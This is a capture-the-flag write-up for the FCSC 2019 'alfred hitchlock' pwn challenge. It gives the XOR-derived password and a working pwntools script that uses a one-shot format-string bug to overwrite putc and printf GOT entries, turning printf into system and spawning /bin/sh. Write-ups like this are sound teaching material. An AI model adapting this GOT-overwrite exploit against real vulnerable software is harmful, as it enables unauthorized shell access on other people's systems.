---
layoud: default
title: "FCSC 2019 - alfred hitchlock"
category: "pwn - medium"
tags: [x86-64, fmtstr]
archive_only: true
---

this is a pretty straightforward challenge, we are provided with with a one try format string primitive, and we have partial relro

firstly we have to enter a password, in short, the password we enter is xored with a key and compared to a string, by reversing this we figure out that the password is 'Alma_and_Pat'

since its a one go format string we will first overwrite putc@got with main's address to loop back for more tries, then on the second go we overwrite printf@got with system@plt, and finally since printf's got entry got overwritten with system, we will enter '/bin/sh' on a name prompt, which uses printf to print our name back to us, since we overwritten print with system we will execute system('/bin/sh') and get a shell, then we read script_flag.pdf to get the flag

```python
from pwn import *

elf = ELF('./alfred')
#p = remote('localhost', 4000)
p = process(elf.path)
passwd = b"Alma_and_Pat"
context.log_level = 'debug'

p.sendlineafter(b'>>> ', passwd)

payload1 = fmtstr_payload(7, {elf.got['putc']: elf.symbols['main']})
p.sendlineafter(b'>>> ', payload1)

p.sendlineafter(b'>>> ', passwd)

payload2 = fmtstr_payload(7, {elf.got['printf']: elf.plt['system']})
p.sendlineafter(b'>>> ', payload2)

p.sendlineafter(b'unlock:\n', passwd)
p.sendlineafter(b'[Alfred]?:\n', b'/bin/sh')

p.interactive()
# read script_flag.pdf
# copy locally
# open via pdf viewer

```
